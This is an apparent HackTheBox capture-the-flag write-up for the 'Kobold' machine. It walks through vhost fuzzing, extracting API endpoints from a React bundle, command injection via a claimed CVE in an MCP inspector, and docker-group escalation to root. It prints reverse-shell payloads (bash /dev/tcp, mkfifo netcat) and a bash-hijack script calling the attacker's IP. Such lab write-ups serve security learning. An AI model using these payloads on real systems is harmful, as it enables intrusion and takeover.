# Kobold

**By Stager** | FashilHack

---
## What is this machine

Kobold is a web-focused Linux box on HackTheBox that revolves around modern web application behavior — specifically a frontend-heavy SPA (Single Page Application) backed by an API.

This machine taught me that not every web app exposes directories, and not every target behaves like a traditional website. The entire attack chain required understanding how modern applications are built — from the frontend all the way down to the API and the server executing commands.

---
## Target

```
IP:  10.129.24.42
Domain: kobold.htb
Subdomain: mcp.kobold.htb
OS: Linux (Ubuntu)
```

---
## Step 1 — Nmap & Initial Reconnaissance

Started with a full service and version scan:

```bash
nmap -sV -sC -p- -T4 10.129.24.42
```

Found three open ports: 22 (SSH), 80 (HTTP), 443 (HTTPS). Both web ports redirect to `kobold.htb`. The SSL certificate revealed something important:

```
Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
```

The wildcard `*.kobold.htb` in the certificate told me there are subdomains waiting to be found. This became the next focus.

Added the domain to hosts:
```bash
sudo nano /etc/hosts
# added:
10.129.24.42 kobold.htb
```

![[stager/writeups/write-ups/kobold/nmap.png]]

---

## Step 2 — Web Enumeration & First Gobuster Problems

Started with standard directory brute forcing on the main domain:

```bash
gobuster dir -u http://kobold.htb -w /usr/share/wordlists/dirb/common.txt
```

This ran but returned nothing interesting. The site was a static landing page for "Kobold Operations Suite" — nothing exploitable on the surface.

Then the problems started. When I tried HTTP, gobuster reported that every random path returned a 301 redirect with the same size — meaning the server redirects everything, making it impossible to distinguish real from fake paths.

When I tried HTTPS, I got TLS certificate errors because the cert is self-signed.

The fix was to use `-k` to skip cert verification and `--exclude-length` to filter out the wildcard redirect size. But even then, the subdomain mcp.kobold.htb timed out constantly — because I was trying to scan a subdomain that wasn't in my hosts file yet.

**Key lesson:** Gobuster failing is not always a tool problem. Sometimes it's telling you something about the target.

---

## Step 3 — Subdomain Discovery (VHOST Enumeration)

The SSL wildcard cert was the clue. I needed to find the hidden subdomain using vhost fuzzing — not directory brute forcing.

The difference matters here. Gobuster's `vhost` mode sends requests with a modified `Host` header like `Host: FUZZ.kobold.htb`. The server responds differently depending on whether that vhost exists. No DNS entry needed — it works purely through the HTTP Host header.

```bash
gobuster vhost -u http://kobold.htb \
  -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 5 \
  -r -k
```

Found `mcp.kobold.htb` — gobuster errored on it specifically with "no such host" which paradoxically confirmed it existed, because it tried to resolve it as real DNS instead of using the Host header approach.

Added it to hosts:

```bash
10.129.24.42 kobold.htb mcp.kobold.htb
```

![[found subdomain.png]]

---

## Step 4 — Analyzing the Subdomain

Visited `https://mcp.kobold.htb` in the browser — got a blank white page with the title "MCPJam Inspector" and a logo. Nothing else visible.

Confirmed with curl that HTTP redirects to HTTPS:

```bash
curl -v -H "Host: mcp.kobold.htb" http://10.129.24.42
# Returns: 301 → https://mcp.kobold.htb
```

Tried directory brute forcing again — got a new error:

```
server returns 200 for random paths (Length: 466)
```

Every path returned 200 with the same 466 byte response. This is called wildcard/catch-all routing — the server returns the same page for everything. Gobuster cannot work here because it cannot tell real from fake.

## Step 5 — Frontend Analysis (The Real Breakthrough)

Since directories were useless, I pulled the raw HTML:

```bash
curl -k https://mcp.kobold.htb
```

Got:

```html
<div id="root"></div>
<script src="/assets/index-DRYhT9Xb.js"></script>
```

This is a React Single Page Application. The entire application logic — including all API endpoints — is compiled into that one JavaScript file. This is where the real intelligence is.

Downloaded it:

```bash
curl -k https://mcp.kobold.htb/assets/index-DRYhT9Xb.js -o app.js
```

Then extracted all API endpoints hardcoded inside:

```bash
cat app.js | grep -oE '"/(api|sse|mcp|connect|tools)[^"]*"'
```

This revealed the entire backend API structure:
```
/api/mcp/connect
/api/mcp/servers
/api/mcp/tools/list
/api/mcp/tools/execute
/api/mcp/resources/read
/api/mcp/chat
...
```

**Mindset shift:** Stop thinking "find directories." Start thinking "what API is this frontend talking to?"

![[downloaded app.js in subdomain it showing.png]]

![[api endpoints hardcorded inside react app found.png]]

## Step 6 — API Testing

Tested the servers endpoint first:

```bash
curl -k https://mcp.kobold.htb/api/mcp/servers
# {"success":true,"servers":[]}
```

The API was alive and responding with JSON. No servers connected yet.

Tested connect with GET — got HTML back, not useful. The API needs POST with JSON:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"url":"test"}'
# {"success":false,"error":"serverConfig is required"}
```

This confirmed three things — the endpoint exists, the backend is active, and it expects structured JSON with a `serverConfig` field. This was the vulnerability entry point.

## Step 7 — RCE via CVE-2026-23520

Researched the `/api/mcp/connect` endpoint and found CVE-2026-23520 — an unauthenticated command injection vulnerability in Arcane MCP Server. The `serverConfig.command` field executes arbitrary system commands with no authentication required.

Found a public PoC and adapted it:

```python
data = {
    "serverConfig": {
        "command": "bash",
        "args": ["-c", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"],
        "env": {}
    },
    "serverId": "exploit"
}
```

Set up listener:

```bash
nc -lvnp 3334
```

Ran exploit:

```bash
python3 cve-2026-23520.py mcp.kobold.htb 443 10.10.17.239 3334
```

The exploit showed a timeout error — but the shell came back anyway. The command executed successfully even though the HTTP response failed. Got shell as ben.

```bash
whoami
# ben
```

![[netcat getting shell.png]]

---

## Step 8 — User Flag

```bash
cat /home/ben/user.txt
```

![[stager/writeups/write-ups/kobold/user flag.png]]

---

## Step 9 — Post Exploitation Enumeration

Stabilized the shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

Checked identity:

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

Nothing special visible. Docker wasn't showing. But I didn't stop there.

Ran standard privilege escalation enumeration:

```bash
sudo -l          # asked for password — dead end
find / -perm -4000 2>/dev/null   # SUID binaries
cat /etc/group   # what groups exist
find / -writable 2>/dev/null     # writable files
getcap -r / 2>/dev/null          # capabilities
cat /etc/crontab                 # cron jobs
ps aux | grep root               # root processes
systemctl list-units --type=service --state=running  # services
```

---

## Step 10 — What I Found and What I Tried First (The Writable Bash Path)

Two findings stood out immediately:

**Finding 1 — World writable bash:**

```bash
ls -la /usr/bin/bash
# -rwxrwxrwx 1 root root 1446024 /usr/bin/bash
```

Everyone on the system can write to bash. This is called binary hijacking — if something root runs calls bash, you replace bash with your malicious script, root executes your code.

**Finding 2 — Docker group exists:**

```bash
cat /etc/group | grep docker
# docker:x:111:alice
```

Docker was on the system. Alice was in it. Ben wasn't listed — but that didn't mean ben couldn't access it.

I chose to explore the writable bash path first because it was the more interesting finding.
**The binary hijacking attempt:**
The attack logic is:

```
root process calls /usr/bin/bash
     ↓
we replaced bash with our fake script
     ↓
root executes our script
     ↓
we get root shell
```

From `ps aux` and `systemctl` I could see the arcane service running as root — this is the MCP server itself. It executes commands through bash when processing requests.

However every time I tried to replace bash I hit "Text file busy" — the OS locks a binary while any process is using it. My own shell was bash, so bash was always busy.

The fix was to get a completely clean shell with no bash in the process tree. I modified the exploit to use the mkfifo netcat method instead of bash redirection:

```python
payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
data = {
    "serverConfig": {
        "command": "sh",
        "args": ["-c", payload],
        "env": {}
    }
}
```

This gave a clean sh shell with zero bash processes:

```bash
ps aux | grep bash
# only shows the grep itself — no bash
```

Now the copy worked:

```bash
cp /usr/bin/bash /tmp/bash.bak
cat > /tmp/fakebash.sh << 'EOF'
#!/tmp/bash.bak
/tmp/bash.bak -i >& /dev/tcp/10.10.17.239/4441 0>&1
exec /tmp/bash.bak "$@"
EOF
chmod +x /tmp/fakebash.sh
cp /tmp/fakebash.sh /usr/bin/bash
```

Triggered it through the arcane API — got a shell back, but still as ben. The arcane service drops privileges to ben when executing user commands even though the process itself runs as root. The binary hijacking worked technically but the privilege level was wrong.

**Conclusion on this path:** The world-writable bash is a real misconfiguration and the attack is theoretically sound, but on this machine the arcane service doesn't execute commands as root — it drops to ben first. Dead end. Restored bash:

```bash
cp /tmp/bash.bak /usr/bin/bash
```

## Step 11 — Privilege Escalation via Docker

Back to Finding 2. Ben wasn't listed in `/etc/group` for docker, but `newgrp` is in the SUID list:

```bash
find / -perm -4000 2>/dev/null | grep newgrp
# /usr/bin/newgrp
```

`newgrp` is SUID and its purpose is to switch your active group in the current session. Even if docker membership isn't visible in `id`, it can exist in the system and `newgrp` can activate it.

```bash
newgrp docker
docker ps
```

Docker responded — showing a running container called `bin` using the `privatebin/nginx-fpm-alpine:2.0.2` image. Ben had docker access. The group membership existed but wasn't loaded into the current session until `newgrp` activated it.

After confirming docker worked, stabilized the shell properly:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
newgrp docker
```

![[docker running.png]]

## Step 12 — Docker Breakout to Root
Being in the docker group is effectively root. Docker can mount the entire host filesystem into a container running as root, giving full read/write access to everything on the host.

Used the privatebin image that was already pulled on the machine:

```bash
docker run --rm -it -u 0 \
  --entrypoint sh \
  -v /:/mnt \
  privatebin/nginx-fpm-alpine:2.0.2
```

Inside the container:

```bash
chroot /mnt sh
whoami
# root
cat /root/root.txt
```

**Why this works:** The container runs as uid 0 (root). The `-v /:/mnt` flag mounts the entire host filesystem into `/mnt` inside the container. `chroot /mnt` makes that mounted filesystem the new root. From inside, you have full root access to everything on the host machine.

![[stager/writeups/write-ups/kobold/root flag.png]]

## The Full Chain
```
Nmap → wildcard SSL cert → subdomains exist
  ↓
VHOST fuzzing → mcp.kobold.htb discovered
  ↓
Browser → blank page → SPA detected
  ↓
curl → 200 for everything → wildcard routing
  ↓
JavaScript analysis → API endpoints extracted
  ↓
POST /api/mcp/connect → serverConfig executes commands
  ↓
CVE-2026-23520 → RCE as ben
  ↓
Enumeration → writable bash + docker group
  ↓
Binary hijacking attempted → failed (arcane drops to ben)
  ↓
newgrp docker → docker access confirmed
  ↓
docker run → mount host filesystem → chroot → root
```

---
## What I Learned

**Gobuster failing is information, not failure.** Wildcard responses and timeouts tell you what kind of application you're dealing with.

**JavaScript is the map.** In SPA applications, the frontend contains every API endpoint the backend exposes. Analyzing the JS file gave me the full attack surface without any brute forcing.

**Enumeration paths sometimes lead nowhere — and that's fine.** The writable bash was a real finding and worth pursuing. Understanding why it didn't work (privilege dropping) taught more than just jumping straight to docker would have.

**Group membership isn't always visible.** `id` not showing docker doesn't mean docker access doesn't exist. Always check `/etc/group` and test with `newgrp`.

**Docker group = root.** Any user in the docker group can mount the host filesystem and escape to root. It's a well known privilege escalation vector documented on GTFOBins.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._